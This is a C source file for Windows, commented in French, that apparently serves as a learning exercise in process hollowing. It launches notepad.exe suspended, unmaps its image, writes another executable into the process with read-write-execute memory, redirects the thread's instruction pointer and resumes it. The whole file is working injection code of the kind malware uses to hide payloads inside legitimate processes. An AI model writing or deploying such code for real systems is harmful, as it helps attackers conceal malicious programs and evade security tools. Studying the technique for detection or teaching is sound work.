
#include <windows.h>
#include <winternl.h>


#define Debug(fmt, ...) _Debug(0, __FILE__, __FUNCTION__, __LINE__, fmt, ##__VA_ARGS__)
#define Fail(fmt, ...) _Debug(1, __FILE__, __FUNCTION__, __LINE__, fmt, ##__VA_ARGS__)


int __stdcall WinMain(HINSTANCE, HINSTANCE, LPSTR, int);

// On fiat que WinMainCRSTStartup soit notre point d'entrée
#pragma comment(linker, "/ENTRY:WinMainCRTStartup")
void __stdcall WinMainCRTStartup(void)
{
    // Appel manuel a WinMain:
    int ret = WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOWDEFAULT);
    ExitProcess(ret);
}


void _Debug(
        BOOL fail,
        const char *file, const char* func, int line,
        const char *fmt, ...)
{
    char buf[1024] = {0};
    char *ptr = buf;
    char *prefix = fail ? "ERROR" : "DEBUG";
    ptr += wsprintfA(ptr, "[%s - PID %lu] ", prefix, GetCurrentProcessId());

    va_list args;
    va_start(args, fmt);
    ptr += wvsprintfA(ptr, fmt, args);
    va_end(args);

    ptr += wsprintfA(ptr, " (%s() @ %s:%d)\r\n",
            func, file, line);

    HANDLE hFile = CreateFileA(
        "Z:\\dll\\Process_hollowing\\debug.log",
        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        MessageBoxA(NULL, "Can't open DEBUG file !", __FILE__, MB_ICONERROR);
        fail = TRUE;
    }
    else {
        WriteFile(hFile, buf, ptr-buf, NULL, NULL);
        CloseHandle(hFile);
    }
    if (fail)
        ExitProcess(1);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    //1. Creer un processus suspendu
    PROCESS_INFORMATION oldpe_procInfo;
    STARTUPINFO si = {0};
    si.cb = sizeof(si);
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &oldpe_procInfo);
    
   //2. Obtenir l'addresse virtuelle de la PEB de oldpe depuis la pbi
    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcess(oldpe_procInfo.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    DWORD64 pebAddress = (DWORD64)pbi.PebBaseAddress;
    
    //3. Lire le PEB de oldpe pour obtenir l'addresse de base de l'image
    DWORD64 imageBaseAddress = 0;
    ReadProcessMemory(oldpe_procInfo.hProcess, (LPCVOID)(pebAddress + 0x10), &imageBaseAddress, sizeof(DWORD64), NULL);
    Debug("ImageBaseAddress: %p", imageBaseAddress);

    //4 Charger le binaire (nouveau PE), lire ses headers et taille d’image
    HANDLE hFile = CreateFileA("origPe.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fileSize);
    DWORD bytesRead;
    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    Debug("OPPA");

    // Lire les headers PE
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)buffer;
    IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)(buffer + dosHeader->e_lfanew);
    SIZE_T sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
    SIZE_T sizeOfHeaders = ntHeaders->OptionalHeader.SizeOfHeaders;
    DWORD64 newImageBase = ntHeaders->OptionalHeader.ImageBase;
    Debug("NewImageBase: %p", newImageBase);


    //5. Étape 5 : Désallouer l’ancien PE (UnmapViewOfSection)

    // il faut la déclarer parce qu'elle n'est pas documentée ¯\_(ツ)_/¯
    typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    if (NtUnmapViewOfSection == NULL) {
        Debug("Impossible de charger NtUnmapViewOfSection");
        return -1;
    }


    NtUnmapViewOfSection(oldpe_procInfo.hProcess, (PVOID)imageBaseAddress);

    // Étape 6 : Allouer la mémoire pour ton nouveau PE dans le processus cible
    PVOID remoteImage = VirtualAllocEx(oldpe_procInfo.hProcess, (LPVOID)newImageBase,
                                   sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Copier les headers
    WriteProcessMemory(oldpe_procInfo.hProcess, remoteImage, buffer, sizeOfHeaders, NULL);


    //Étapes 7 et 8 : Copier les headers et sections
    // Copier les sections
    IMAGE_SECTION_HEADER* section = (IMAGE_SECTION_HEADER*)((BYTE*)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID dest = (LPVOID)((BYTE*)remoteImage + section[i].VirtualAddress);
        LPVOID src  = (LPVOID)(buffer + section[i].PointerToRawData);
        WriteProcessMemory(oldpe_procInfo.hProcess, dest, src, section[i].SizeOfRawData, NULL);
    }


    // Étape 9 : Modifier RIP
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(oldpe_procInfo.hThread, &ctx);
    ctx.Rip = (DWORD64)((BYTE*)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(oldpe_procInfo.hThread, &ctx);


    //Étape 10 modifier ImageBaseAddress dans la PEB si elle a changé
    WriteProcessMemory(oldpe_procInfo.hProcess, (PVOID)(pebAddress + 0x10), &newImageBase, sizeof(DWORD64), NULL);

    // Etape 11 reprendre le thread
    ResumeThread(oldpe_procInfo.hThread);





}

